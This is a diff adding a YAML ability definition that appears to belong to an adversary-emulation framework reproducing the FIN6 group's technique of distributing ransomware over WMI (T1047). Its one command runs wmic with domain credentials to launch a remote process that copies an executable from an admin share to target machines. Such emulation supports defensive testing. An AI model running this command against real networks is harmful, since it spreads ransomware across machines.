@@ -1,0 +1,32 @@
+ability_id: b393c022-329a-4c52-ab1f-eb594ee8d3cd
+access: {}
+additional_info: {}
+buckets:
+- execution
+delete_payload: true
+description: FIN6 utilizes WMI to distribute ransomware to intended targets
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: start wmic /node:#{Ransomware_recipient} /user:#{domain_user} /password:#{password}
+    process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe
+    c:\windows\temp\"
+  language: null
+  name: cmd
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: WMI Ransomware Distribution
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: execution
+technique_id: T1047
+technique_name: Windows Management Instrumentation
